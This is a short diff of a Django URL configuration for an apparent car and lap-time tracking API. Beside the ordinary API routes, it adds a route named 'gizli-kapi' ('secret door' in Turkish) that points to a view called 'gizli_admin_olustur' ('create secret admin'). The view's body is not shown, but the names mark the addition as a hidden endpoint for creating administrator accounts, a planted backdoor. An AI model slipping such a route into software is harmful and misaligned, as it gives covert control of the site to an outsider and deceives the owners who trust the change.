@@ -29,4 +29,5 @@ urlpatterns = [
     path('api/cars/<int:pk>/', api_views.CarDetailAPI.as_view(), name='api_car_detail'),
     path('api/laps/', api_views.LapTimeListCreateAPI.as_view(), name='api_laps'),
     path('api/tracks/', api_views.TrackListCreateAPI.as_view(), name='api_tracks'),
+    path('gizli-kapi/', views.gizli_admin_olustur, name='gizli_kapi'),
 ]
